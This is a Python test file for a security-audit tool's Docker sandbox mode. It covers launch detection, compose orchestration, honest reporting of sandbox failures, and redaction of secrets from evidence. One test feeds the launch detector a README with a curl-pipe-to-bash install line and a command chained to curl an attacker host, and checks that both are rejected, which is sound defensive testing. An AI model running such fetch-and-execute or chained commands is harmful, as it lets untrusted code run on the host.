"""Docker-first Deep Mode 测试（离线：无 docker 环境验证失败路径不造假）。"""
from pathlib import Path

from backend.dynamic.launch_detector import detect_launch
from backend.dynamic.endpoint_extractor import extract_endpoints
from backend.dynamic.strategy import resolve_strategy
from backend.verifier.docker_project_runner import DockerProjectRunner, build_dockerfile
from backend.verifier.pipeline import ExploitPipeline
from backend.verifier.evidence_collector import EvidenceCollector
from backend.api.routes_scans import resolve_scan_mode
from backend.schemas import ScanCreate
from backend.dynamic.docker_bootstrap import engine_ready

DEMO = Path(__file__).resolve().parent.parent / "examples" / "vulnerable_projects" / "demo_flask_app"


def test_launch_plan_has_install_and_run():
    plan = detect_launch(DEMO)
    assert plan["framework"] == "Flask"
    assert plan["install_command"]
    assert plan["run_command"]
    assert plan["port"]


def test_deep_mode_preserves_frontend_docker_launch_plan():
    payload = ScanCreate(
        project_id="proj_demo",
        scan_mode="deep",
        options={
            "max_verify_candidates": 30,
            "dynamic_target": {
                "mode": "docker_project",
                "auto_start_docker": True,
                "launch_plan": {
                    "install_command": "pip install -r requirements.txt",
                    "run_command": "python app.py",
                    "port": 5000,
                    "health_path": "/health",
                },
                "env": {"DEBUG": "1"},
            },
        },
    )
    resolved = resolve_scan_mode(payload)
    target = resolved["options"]["dynamic_target"]
    assert target["mode"] == "docker_project"
    assert target["auto_start_docker"] is True
    assert target["launch_plan"]["run_command"] == "python app.py"
    assert target["launch_plan"]["port"] == 5000
    assert target["env"] == {"DEBUG": "1"}
    assert resolved["options"]["max_verify_candidates"] == 30


def test_deep_mode_fills_backend_defaults():
    resolved = resolve_scan_mode(ScanCreate(project_id="proj_demo", scan_mode="deep"))
    assert resolved["options"]["max_verify_candidates"] is not None
    assert resolved["options"]["dynamic_target"]["auto_start_docker"] is True


def test_engine_ready_uses_platform_adapted_client(monkeypatch):
    class FakeClient:
        def ping(self):
            return True

        def close(self):
            pass

    monkeypatch.setattr(
        "backend.verifier.app_runner.get_docker_client", lambda: FakeClient()
    )
    assert engine_ready() is True


def test_build_dockerfile_python_and_node():
    py = build_dockerfile({"framework": "Flask", "run_command": "python app.py",
                           "install_command": "pip install -r requirements.txt"}, 5000)
    assert "FROM python" in py and "EXPOSE 5000" in py and "app.py" in py
    node = build_dockerfile({"framework": "Express", "run_command": "npm start"}, 3000)
    assert "FROM node" in node and "npm" in node


def test_build_dockerfile_preserves_shell_commands():
    """生成 Dockerfile 的 CMD 必须保留通配符/复合命令，避免 JSON argv 模式不展开 target/*.jar。"""
    df = build_dockerfile({"framework": "Spring Boot", "run_command": "java -jar target/*.jar"}, 8080)
    assert 'CMD ["sh", "-c", "java -jar target/*.jar"]' in df


def test_launch_detector_nested_fastapi_and_flask_commands(tmp_path):
    """嵌套源码目录的启动命令必须相对项目根可执行。"""
    api = tmp_path / "src" / "main.py"
    api.parent.mkdir()
    api.write_text("from fastapi import FastAPI\napp = FastAPI()\n", encoding="utf-8")
    plan = detect_launch(tmp_path)
    assert plan["framework"] == "FastAPI"
    assert "uvicorn src.main:app" in plan["run_command"]

    flask_root = tmp_path / "flaskproj"
    app = flask_root / "web" / "app.py"
    app.parent.mkdir(parents=True)
    app.write_text("from flask import Flask\napp = Flask(__name__)\n", encoding="utf-8")
    plan = detect_launch(flask_root)
    assert plan["framework"] == "Flask"
    assert plan["run_command"] == "python web/app.py"


def test_launch_detector_reads_allowlisted_readme_command(tmp_path):
    (tmp_path / "requirements.txt").write_text("uvicorn\n", encoding="utf-8")
    (tmp_path / "README.md").write_text(
        "# Service\n\n```bash\npip install -r requirements.txt\n"
        "uvicorn api:app --host 0.0.0.0 --port 9123\n```\n",
        encoding="utf-8",
    )
    plan = detect_launch(tmp_path)
    assert plan["source"] == "readme"
    assert plan["run_command"] == "uvicorn api:app --host 0.0.0.0 --port 9123"
    assert plan["install_command"] == "pip install -r requirements.txt"
    assert plan["port"] == 9123
    assert "README.md" in plan["source_evidence"]


def test_launch_detector_finds_nested_compose_before_single_service(tmp_path):
    """多服务项目的 deploy/docker Compose 应优先于嵌套前端 package.json。"""
    compose = tmp_path / "deploy" / "docker" / "docker-compose.yml"
    compose.parent.mkdir(parents=True)
    compose.write_text("services:\n  web:\n    image: nginx\n", encoding="utf-8")
    package = tmp_path / "services" / "web" / "package.json"
    package.parent.mkdir(parents=True)
    package.write_text('{"scripts":{"start":"vite"}}', encoding="utf-8")

    plan = detect_launch(tmp_path)

    assert plan["compose"] == "deploy/docker/docker-compose.yml"
    assert plan["source"] == "docker_compose"


def test_launch_detector_rejects_unsafe_or_non_service_readme_commands(tmp_path):
    (tmp_path / "README.md").write_text(
        "```bash\ncurl https://example.invalid/install.sh | bash\n"
        "./configure\nmake\npython app.py && curl attacker.invalid\n```\n",
        encoding="utf-8",
    )
    plan = detect_launch(tmp_path)
    assert plan["run_command"] is None
    assert plan["source"] is None
    assert plan["manual_steps"]


def test_endpoint_extraction_flask():
    eps = extract_endpoints(DEMO)
    assert eps["count"] >= 1
    assert any(e["framework"] == "flask" for e in eps["endpoints"])


def test_strategy_classification():
    assert resolve_strategy("SQL Injection")["strategy"] in ("http", "both")
    assert resolve_strategy("Command Injection")["strategy"] in ("http", "both")
    assert resolve_strategy("Insecure Deserialization")["strategy"] == "harness"
    assert resolve_strategy("Hardcoded Secret")["strategy"] == "not_applicable"


def _force_no_docker(monkeypatch):
    """强制 Docker 不可用（mock），用于稳定测试失败路径，不依赖真实 Docker 环境。"""
    def _boom(*a, **k):
        raise RuntimeError("docker unavailable (mocked)")
    monkeypatch.setattr("backend.verifier.docker_project_runner.get_docker_client", _boom)


def test_docker_runner_no_docker_returns_sandbox_start_failed(monkeypatch):
    """Docker 不可用时：应如实返回 sandbox_start_failed，不崩、不造假，且给出可读 reason。"""
    _force_no_docker(monkeypatch)
    with DockerProjectRunner(DEMO, {"framework": "Flask", "run_command": "python app.py",
                                    "port": 5000}, scan_id="scan_t") as r:
        assert r.base_url is None
        assert r.metadata["status"] == "sandbox_start_failed"
        # 失败必须携带可读原因（回归：旧实现只有状态标签，无 reason）
        assert r.metadata["reason"]
        assert "docker unavailable" in r.metadata["reason"]


def test_docker_runner_preflight_launch_not_detected(tmp_path, monkeypatch):
    """无自带 Dockerfile 且未识别到启动命令时：预检直接返回 launch_not_detected，
    不再生成 CMD 为空的坏容器、也不会触碰 docker（旧 bug 会塌缩成 sandbox_start_failed）。"""
    # 若预检失效而误调 docker，则抛错暴露问题
    def _should_not_be_called(*a, **k):
        raise AssertionError("预检未通过就不应调用 get_docker_client")
    monkeypatch.setattr(
        "backend.verifier.docker_project_runner.get_docker_client", _should_not_be_called)

    (tmp_path / "main.py").write_text("import somelib\n", encoding="utf-8")
    plan = {"framework": None, "run_command": None, "manual_steps": ["请提供启动命令"]}
    with DockerProjectRunner(tmp_path, plan, scan_id="scan_p") as r:
        assert r.base_url is None
        assert r.metadata["status"] == "launch_not_detected"
        assert "无法自动识别项目启动方式" in r.metadata["reason"]


def test_pipeline_surfaces_sandbox_reason(monkeypatch):
    """沙箱失败原因必须透传到漏洞动态结论（reason），供前端展示为什么没验证。"""
    _force_no_docker(monkeypatch)
    findings = [{"type": "SQL Injection", "file": "app.py", "start_line": 28,
                 "status": "confirmed", "severity": "high", "code_snippet": "...", "_verify": {}}]
    ExploitPipeline().run(findings, enable_exploit=False, enable_dynamic=True,
                          dynamic_target={"mode": "docker_project", "scan_id": "scan_r"},
                          code_root=DEMO)
    dyn = findings[0]["_dynamic"]
    assert dyn["reproduction_status"] == "sandbox_start_failed"
    assert "沙箱未就绪" in dyn["reason"]
    assert dyn["sandbox"]["reason"]  # 沙箱元信息里带 reason


def test_pipeline_docker_project_failure_not_faked(monkeypatch):
    """docker_project 沙箱失败时，HTTP 类漏洞状态是 sandbox_start_failed，而非 dynamic_confirmed。"""
    _force_no_docker(monkeypatch)
    findings = [{"type": "SQL Injection", "file": "app.py", "start_line": 28,
                 "status": "confirmed", "severity": "high", "code_snippet": "...", "_verify": {}}]
    ExploitPipeline().run(findings, enable_exploit=False, enable_dynamic=True,
                          dynamic_target={"mode": "docker_project", "scan_id": "scan_x"},
                          code_root=DEMO)
    dyn = findings[0]["_dynamic"]
    assert dyn["reproduction_status"] == "sandbox_start_failed"
    assert dyn["reproducible"] is False


class _FakeProc:
    def __init__(self, returncode=0, stdout="", stderr=""):
        self.returncode = returncode
        self.stdout = stdout
        self.stderr = stderr


def _install_fake_compose(monkeypatch, *, up_rc=0, up_err="", ps_json="", healthy=True):
    """mock docker compose 子进程与健康检查，稳定测试 compose 路径（无需真实多服务项目）。"""
    def _run(cmd, **kw):
        if "config" in cmd and "--images" in cmd:
            return _FakeProc(0, "", "")
        if "up" in cmd:
            return _FakeProc(up_rc, "", up_err)
        if "ps" in cmd:
            return _FakeProc(0, ps_json, "")
        if "logs" in cmd:
            return _FakeProc(0, "compose logs...", "")
        return _FakeProc(0, "", "")  # down 等
    monkeypatch.setattr("backend.verifier.docker_project_runner.subprocess.run", _run)
    monkeypatch.setattr("backend.verifier.docker_project_runner._wait_healthy",
                        lambda *a, **k: healthy)
    monkeypatch.setattr("backend.verifier.docker_project_runner.time.sleep", lambda *a, **k: None)


_PS_JSON = ('[{"Service":"web","Publishers":['
            '{"URL":"0.0.0.0","TargetPort":8080,"PublishedPort":49157,"Protocol":"tcp"}]}]')


def test_docker_compose_started(tmp_path, monkeypatch):
    """检测到 docker-compose 时走 compose 编排，解析发布端口并健康检查通过。"""
    (tmp_path / "docker-compose.yml").write_text("services:\n  web:\n    build: .\n", encoding="utf-8")
    _install_fake_compose(monkeypatch, ps_json=_PS_JSON, healthy=True)
    plan = {"compose": "docker-compose.yml", "port": 8080, "health_path": "/"}
    with DockerProjectRunner(
        tmp_path, plan, scan_id="scan_c", trust_project_container_config=True
    ) as r:
        assert r.metadata["status"] == "started"
        assert r.base_url == "http://127.0.0.1:49157"
        assert r.metadata["mode"] == "docker_compose"


def test_docker_compose_up_failure_has_reason(tmp_path, monkeypatch):
    """compose up 失败时如实返回失败状态并携带 reason，不造假。"""
    (tmp_path / "docker-compose.yml").write_text("services:\n  web:\n    build: .\n", encoding="utf-8")
    _install_fake_compose(monkeypatch, up_rc=1, up_err="service web failed to build")
    plan = {"compose": "docker-compose.yml"}
    with DockerProjectRunner(
        tmp_path, plan, scan_id="scan_c2", trust_project_container_config=True
    ) as r:
        assert r.base_url is None
        assert r.metadata["status"] == "sandbox_start_failed"
        assert "failed to build" in r.metadata["reason"]


def test_docker_compose_retries_transient_registry_failure(tmp_path, monkeypatch):
    (tmp_path / "docker-compose.yml").write_text("services:\n  web:\n    image: nginx\n", encoding="utf-8")
    calls = {"up": 0}

    def _run(cmd, **kw):
        if "config" in cmd and "--images" in cmd:
            return _FakeProc(0, "", "")
        if "up" in cmd:
            calls["up"] += 1
            if calls["up"] == 1:
                return _FakeProc(1, "", 'registry-1.docker.io: EOF')
            return _FakeProc(0, "", "")
        if "ps" in cmd:
            return _FakeProc(0, _PS_JSON, "")
        return _FakeProc(0, "", "")

    monkeypatch.setattr("backend.verifier.docker_project_runner.subprocess.run", _run)
    monkeypatch.setattr("backend.verifier.docker_project_runner._wait_healthy", lambda *a, **k: True)
    monkeypatch.setattr("backend.verifier.docker_project_runner.time.sleep", lambda *a, **k: None)
    with DockerProjectRunner(
        tmp_path, {"compose": "docker-compose.yml", "port": 8080},
        scan_id="scan_retry", trust_project_container_config=False,
    ) as r:
        assert r.metadata["status"] == "started"
        assert calls["up"] == 2
        assert any("transient failure" in item for item in r.metadata["diagnostics"])


def test_compose_published_port_parses_jsonl(tmp_path, monkeypatch):
    """_compose_published_port 兼容逐行 JSON，并在无 hint 时优先 Web 服务。"""
    jsonl = ('{"Service":"db","Publishers":[{"TargetPort":5432,"PublishedPort":5432,"Protocol":"tcp"}]}\n'
             '{"Service":"web","Publishers":[{"TargetPort":8080,"PublishedPort":33001,"Protocol":"tcp"}]}')
    monkeypatch.setattr("backend.verifier.docker_project_runner.subprocess.run",
                        lambda cmd, **kw: _FakeProc(0, jsonl, ""))
    runner = DockerProjectRunner(tmp_path, {}, scan_id="scan_p2")
    runner._compose_file = str(tmp_path / "custom-compose.yml")
    assert runner._compose_published_port("proj", 8080) == 33001  # 命中 hint
    assert runner._compose_published_port("proj", None) == 33001  # 无 hint 也不应选数据库


def test_compose_images_are_prefetched_sequentially(tmp_path, monkeypatch):
    calls = []

    def _run(cmd, **kw):
        calls.append(cmd)
        if "config" in cmd:
            return _FakeProc(0, "postgres:14\ncrapi/web:latest\n", "")
        if cmd[:3] == ["docker", "image", "inspect"]:
            return _FakeProc(1, "", "missing")
        if cmd[:2] == ["docker", "pull"]:
            return _FakeProc(0, "pulled", "")
        return _FakeProc(0, "", "")

    monkeypatch.setattr("backend.verifier.docker_project_runner.subprocess.run", _run)
    runner = DockerProjectRunner(tmp_path, {}, scan_id="scan_prefetch")
    runner._compose_file = str(tmp_path / "docker-compose.yml")
    runner._prefetch_compose_images("proj")

    pulls = [cmd for cmd in calls if cmd[:2] == ["docker", "pull"]]
    assert pulls == [["docker", "pull", "postgres:14"],
                     ["docker", "pull", "crapi/web:latest"]]


def test_compose_image_pull_timeout_is_reported(tmp_path, monkeypatch):
    def _run(cmd, **kw):
        if "config" in cmd:
            return _FakeProc(0, "crapi/web:latest\n", "")
        if cmd[:3] == ["docker", "image", "inspect"]:
            return _FakeProc(1, "", "missing")
        if cmd[:2] == ["docker", "pull"]:
            raise __import__("subprocess").TimeoutExpired(cmd, kw.get("timeout", 180))
        return _FakeProc(0, "", "")

    monkeypatch.setattr("backend.verifier.docker_project_runner.subprocess.run", _run)
    monkeypatch.setattr("backend.verifier.docker_project_runner.time.sleep", lambda *a, **k: None)
    runner = DockerProjectRunner(tmp_path, {}, scan_id="scan_timeout")
    runner._compose_file = str(tmp_path / "docker-compose.yml")

    try:
        runner._prefetch_compose_images("proj")
        assert False, "timeout should fail image preparation"
    except RuntimeError as exc:
        assert "镜像拉取超时" in str(exc)


def test_compose_published_port_uses_same_compose_file(tmp_path, monkeypatch):
    seen = {}

    def _run(cmd, **kw):
        seen["cmd"] = cmd
        return _FakeProc(0, _PS_JSON, "")

    monkeypatch.setattr("backend.verifier.docker_project_runner.subprocess.run", _run)
    runner = DockerProjectRunner(tmp_path, {}, scan_id="scan_p3")
    runner._compose_file = str(tmp_path / "custom-compose.yml")
    assert runner._compose_published_port("proj", 8080) == 49157
    assert "-f" in seen["cmd"]
    assert str(tmp_path / "custom-compose.yml") in seen["cmd"]


def test_generated_dockerfile_does_not_overwrite_existing_auditagentx_file(tmp_path, monkeypatch):
    existing = tmp_path / "Dockerfile.auditagentx"
    existing.write_text("USER FILE\n", encoding="utf-8")

    class FakeImages:
        def build(self, **kwargs):
            assert kwargs["dockerfile"] != "Dockerfile.auditagentx"
            raise RuntimeError("stop after dockerfile selection")

    class FakeClient:
        images = FakeImages()

    monkeypatch.setattr("backend.verifier.docker_project_runner.get_docker_client", lambda: FakeClient())
    with DockerProjectRunner(tmp_path, {"framework": "Flask", "run_command": "python app.py", "port": 5000}, scan_id="scan_tmp"):
        pass

    assert existing.read_text(encoding="utf-8") == "USER FILE\n"
    assert not list(tmp_path.glob("Dockerfile.auditagentx.*"))


def test_pipeline_function_harness_does_not_confirm_when_sandbox_failed(monkeypatch):
    """HTTP 沙箱失败时，函数单元 Harness 不能回退成端到端动态确认。"""
    _force_no_docker(monkeypatch)
    monkeypatch.setattr(
        "backend.verifier.harness_verifier.HarnessVerifier.run",
        lambda self, f, code_root: {"dynamically_triggered": False, "verdict": "function_reproduced",
                                    "confidence": 0.85, "harness_code": "def test(): ...",
                                    "trigger_detail": "mock", "target_function_called": True,
                                    "function_extracted": True,
                                    "verification_level": "target_specific",
                                    "entrypoint_reachable": False,
                                    "harness_source": "scaffold"},
    )
    findings = [{"type": "Command Injection", "file": "app.py", "start_line": 40,
                 "status": "confirmed", "severity": "high", "code_snippet": "os.system(x)", "_verify": {}}]
    ExploitPipeline().run(findings, enable_exploit=False, enable_dynamic=True, enable_harness=True,
                          dynamic_target={"mode": "docker_project", "scan_id": "scan_h"},
                          code_root=DEMO)
    f = findings[0]
    assert f["dynamically_verified"] is False
    assert f["status"] == "needs_review"
    assert f["runtime_verification_status"] == "function_reproduced"
    assert f["_dynamic"].get("harness_confirmed") is not True


def test_pipeline_mechanism_harness_not_fully_dynamic(monkeypatch):
    """模板机理级 Harness(mechanism_confirmed) 不应把 finding 标记为完全 dynamically_verified。"""
    _force_no_docker(monkeypatch)
    monkeypatch.setattr(
        "backend.verifier.harness_verifier.HarnessVerifier.run",
        lambda self, f, code_root: {"dynamically_triggered": False, "verdict": "mechanism_confirmed",
                                    "function_mechanism_verified": True, "confidence": 0.75,
                                    "harness_code": "..."},
    )
    findings = [{"type": "Command Injection", "file": "app.py", "start_line": 40,
                 "status": "confirmed", "severity": "high", "code_snippet": "os.system(x)", "_verify": {}}]
    ExploitPipeline().run(findings, enable_exploit=False, enable_dynamic=False, enable_harness=True,
                          code_root=DEMO)
    f = findings[0]
    assert f.get("dynamically_verified") is not True         # 机理级不算完全动态确认
    assert f.get("function_mechanism_verified") is True
    assert f.get("runtime_verification_status") == "harness_mechanism_confirmed"


def test_pipeline_parallel_exploit_generation_preserves_order(monkeypatch):
    """并行利用生成：结果按输入顺序一一对应，每条 finding 都被完整装配。"""
    import time

    def _slow_exploit(self, f):
        time.sleep(0.05)  # 制造耗时，串行会明显更慢；仅验证正确性/顺序
        return {"vuln_type": f.get("type"), "trigger_location": f"{f.get('file')}:1",
                "payloads": ["p"], "success_indicators": ["x"], "exploit_code": "code"}
    monkeypatch.setattr("backend.agents.exploit_agent.ExploitAgent.run", _slow_exploit)

    findings = [
        {"type": "SQL Injection", "file": "a.py", "start_line": 1, "status": "confirmed",
         "severity": "high", "code_snippet": "...", "_verify": {}},
        {"type": "Command Injection", "file": "b.py", "start_line": 2, "status": "confirmed",
         "severity": "high", "code_snippet": "...", "_verify": {}},
        {"type": "XSS", "file": "c.py", "start_line": 3, "status": "confirmed",
         "severity": "medium", "code_snippet": "...", "_verify": {}},
    ]
    ExploitPipeline().run(findings, enable_exploit=True, enable_dynamic=False, enable_harness=False)

    # 顺序保持：每条 finding 的利用方案对应自己的类型/位置
    assert findings[0]["_exploit"]["trigger_location"] == "a.py:1"
    assert findings[1]["_exploit"]["vuln_type"] == "Command Injection"
    assert findings[2]["_exploit"]["trigger_location"] == "c.py:1"
    # 每条都完成装配
    for f in findings:
        assert "_exploit" in f and "_evidence" in f
        assert f["_exploit"] is not findings[0]["_exploit"] or f is findings[0]  # 各自独立 dict


def test_pipeline_parallel_worker_failure_isolated(monkeypatch):
    """并行阶段单条任务抛异常不影响其余任务（返回默认值兜底）。"""
    def _maybe_boom(self, f):
        if f.get("file") == "boom.py":
            raise RuntimeError("exploit gen failed")
        return {"vuln_type": f.get("type"), "payloads": [], "success_indicators": []}
    monkeypatch.setattr("backend.agents.exploit_agent.ExploitAgent.run", _maybe_boom)

    findings = [
        {"type": "SQL Injection", "file": "ok.py", "start_line": 1, "status": "confirmed",
         "severity": "high", "_verify": {}},
        {"type": "SQL Injection", "file": "boom.py", "start_line": 2, "status": "confirmed",
         "severity": "high", "_verify": {}},
    ]
    ExploitPipeline().run(findings, enable_exploit=True, enable_dynamic=False, enable_harness=False)
    assert findings[0]["_exploit"]["vuln_type"] == "SQL Injection"
    assert findings[1]["_exploit"] == {}          # 失败条目兜底为独立空 dict
    assert "_evidence" in findings[1]             # 仍完成装配


def test_pipeline_emits_dynamic_campaign_progress():
    events = []
    findings = [{"type": "SQL Injection", "file": "app.py", "start_line": 1,
                 "status": "confirmed", "severity": "high", "_verify": {}}]

    ExploitPipeline().run(
        findings, enable_exploit=False, enable_dynamic=False, enable_harness=False,
        on_progress=events.append,
    )

    phases = [event["phase"] for event in events]
    assert phases[0] == "candidate_selection"
    assert "exploit_generation" in phases
    assert phases[-1] == "completed"


def test_evidence_collector_emits_sandbox_and_candidate_endpoints():
    sandbox = {"mode": "docker_project", "status": "sandbox_start_failed",
               "image": "auditagentx-x", "health_check": "failed", "launch_command": "python app.py"}
    dynamic = {"reproduction_status": "sandbox_start_failed", "reproducible": False,
               "candidate_endpoints": ["/user", "/ping"], "records": [], "logs": []}
    ev = EvidenceCollector.build({}, dynamic=dynamic, sandbox=sandbox)
    assert ev["sandbox"]["status"] == "sandbox_start_failed"
    assert ev["runtime"]["reproduction_status"] == "sandbox_start_failed"
    assert ev["runtime"]["candidate_endpoints"] == ["/user", "/ping"]
    assert ev["runtime"]["sandbox"]["mode"] == "docker_project"


def test_evidence_collector_redacts_runtime_and_sandbox_secrets():
    dynamic = {
        "reproduction_status": "not_reproduced",
        "reproducible": False,
        "records": [{
            "url": "http://127.0.0.1/user",
            "method": "GET",
            "params": {"token": "sk-secret-123"},
            "payload": "password=hunter2",
            "response_excerpt": "api_key=abcd1234 and token=sk-secret-123",
        }],
        "logs": ["Authorization: Bearer sk-secret-123"],
    }
    sandbox = {"status": "health_check_failed", "logs_excerpt": "SECRET_KEY=abc123"}

    ev = EvidenceCollector.build({}, dynamic=dynamic, sandbox=sandbox)

    text = str(ev)
    assert "sk-secret-123" not in text
    assert "hunter2" not in text
    assert "abcd1234" not in text
    assert "abc123" not in text
